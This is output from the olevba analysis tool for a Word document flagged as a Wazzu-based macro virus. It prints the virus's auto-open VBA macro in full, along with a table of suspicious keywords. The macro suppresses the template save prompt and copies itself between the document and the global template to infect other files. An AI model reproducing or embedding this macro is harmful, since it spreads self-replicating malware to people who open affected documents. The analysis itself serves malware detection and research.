olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-a2bdab1afb3372892bb9943a5ded984100d3dd2f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-a2bdab1afb3372892bb9943a5ded984100d3dd2f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUtooPen.bas 
in file: Virus.MSWord.Wazzu-based-a2bdab1afb3372892bb9943a5ded984100d3dd2f - OLE stream: 'Macros/VBA/aUtooPen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
On Error GoTo -1: On Error GoTo Gotit
WordBasic.DisableAutoMacros 0
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
WordBasic.FileSummaryInfo Update:=1
Dim d1lg As Object: Set d1lg = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo d1lg
fileMacro$ = d1lg.Directory + "\" + d1lg.FileName + ":aUtooPen"
globMacro$ = "Global:aUtooPen"
MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 4))
If MacroFile$ = ".DOT" Then
    WordBasic.MacroCopy globMacro$, fileMacro$
    WordBasic.FileSaveAs Format:=1
Else
    WordBasic.MacroCopy fileMacro$, globMacro$
End If
Gotit:
    On Error GoTo -1: On Error GoTo 0
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUtooPen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

